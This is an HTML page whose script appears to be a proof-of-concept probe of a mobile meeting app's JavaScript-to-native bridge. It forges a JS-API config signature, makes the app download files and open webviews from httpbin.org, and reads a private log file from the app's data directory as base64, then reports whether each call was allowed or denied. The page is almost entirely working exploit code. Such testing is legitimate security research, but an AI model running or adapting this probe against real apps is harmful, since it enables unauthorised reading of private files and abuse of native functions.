<!doctype html>
<html><head><meta charset="utf-8"><title>P22TB</title></head>
<body><h1>P22TB</h1>
<script>
document.title='P22TB-START';
var q=[], busy=false;
function note(t){
  q.push(String(t));
  kick();
}
function kick(){
  if(busy || !q.length) return;
  busy=true;
  document.title=q.shift();
  setTimeout(function(){ busy=false; kick(); }, 800);
}
function call(mod, method, param){
  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
    callId:mod+'.'+method
  }));
}
function norm(res){
  if(typeof res==='string'){
    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; }
  }
  return res||{};
}
window.__wmpoc=function(res){
  res=norm(res);
  var msg=String(res.message||JSON.stringify(res)).replace(/\|/g,'/');
  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
  note((deny?'D':'A')+':'+(res.callId||'?').replace('Plugin.','/')+':'+res.code+':'+msg.slice(0,64));
};
var steps=[
  function(){ note('JSB='+!!window.JSCallJavaMgr+' loc='+String(location.href).slice(0,50)); },
  function(){ call('CommonPlugin','GetPerformance',{}); },
  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
  function(){ call('OpenApiPlugin','SetOpenJsApiConfig',{}); },
  function(){ call('OpenApiPlugin','JsApiConfig',{url:location.href,timestamp:'1',nonceStr:'a',signature:'b'}); },
  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/16',fileName:'p22.bin',md5:''}); },
  function(){ call('CommonPlugin','GetFileBase64',{path:'/data/data/com.tencent.wemeet.app/files/infiltrator_logs/infiltrator.log'}); },
  function(){ call('IdeaPlugin','DownloadFile',{url:'https://httpbin.org/bytes/16'}); },
  function(){ call('UIPlugin','CreateWebview',{url:'https://httpbin.org/html'}); }
];
var i=0;
function next(){
  if(i>=steps.length){ setTimeout(function(){ note('P22TB-DONE'); }, 1600); return; }
  try{ steps[i](); }catch(e){ note('EX:'+e); }
  i++;
  setTimeout(next, 700);
}
setTimeout(next, 400);
</script>
</body></html>
